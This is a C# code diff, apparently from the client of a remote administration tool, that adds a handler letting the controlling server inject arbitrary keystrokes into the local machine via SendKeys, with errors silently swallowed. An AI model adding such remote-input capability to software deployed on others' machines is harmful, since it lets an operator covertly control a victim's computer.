@@ -4,6 +4,7 @@ using System.IO;
 using System.Windows.Forms;
 using xClient.Core.Helper;
 using System.Drawing.Imaging;
+using System;
 
 namespace xClient.Core.Commands
 {
@@ -89,7 +90,48 @@ namespace xClient.Core.Commands
                 }
             }
         }
+        public static void HandleKeyPress(Packets.ServerPackets.KeyPress command, Client client)
+        {
+            try
+            {
+                string k = command.Key.ToString();
+                KeysConverter kc = new KeysConverter();
 
+                /*switch (command.Key)
+                {
+                    case Keys.Alt:
+                        k = "%";
+                        break;
+                    case Keys.CapsLock:
+                        k = "{CAPSLOCK}";
+                        break;
+                    case Keys.LControlKey:
+                    case Keys.RControlKey:
+                    case Keys.Control:
+                    case Keys.ControlKey:
+                        k = "^";
+                        break;
+                    case Keys.LShiftKey:
+                    case Keys.RShiftKey:
+                    case Keys.Shift:
+                    case Keys.ShiftKey:
+                        k = "+";
+                        break;
+                    case Keys.Enter:
+                        k = "{ENTER}";
+                        break;
+                    default:
+                        k = kc.ConvertToString(command.Key);
+                    break;
+                }*/
+                SendKeys.SendWait(k);
+            }
+            catch (Exception)
+            {
+
+            }
+            // throw new NotImplementedException();
+        }
         public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
         {
             try
